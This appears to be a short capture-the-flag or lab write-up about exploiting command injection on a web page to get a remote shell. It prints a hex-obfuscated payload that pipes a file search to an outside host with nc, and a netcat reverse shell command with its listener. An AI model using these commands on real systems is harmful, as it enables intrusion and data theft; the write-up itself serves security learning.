A simple html web page
## Discovery

Actually, by discovering the endpoint from [[PORT 139]], it was quite simple to see that a bash command could be provided. Then the only thing that was left was to simply see how to get a shell.

This actually took me a little bit of time as i was unaware that actually there are more programs out there than netcat that can be used to get a reverse shell, and that actually, the host had another similar tool called ncat that can be used quite easily, since the page was filtering out ; | &, which are used for most shells. I was trying things of the sort:


```
/bin/bash -c "$(echo -e '\x66\x69\x6e\x64\x20\x2f\x20\x2d\x6e\x61\x6d\x65\x20\x2a\x75\x73\x65\x72\x2a\x20\x2d\x74\x79\x70\x65\x20\x66\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x7c\x20\x6e\x63\x20\x31\x30\x2e\x31\x30\x2e\x35\x37\x2e\x32\x33\x20\x36\x36\x36\x36\x20')"

```

When this was actually quite simpler, i only had to do:

```bash
victim$ nc 10.10.244.42 6666 -e /bin/bash
host$ netcat -lvnp 6666
```

Which was provided with the following web page https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/.

Now we can go to our little [[remote shell]]


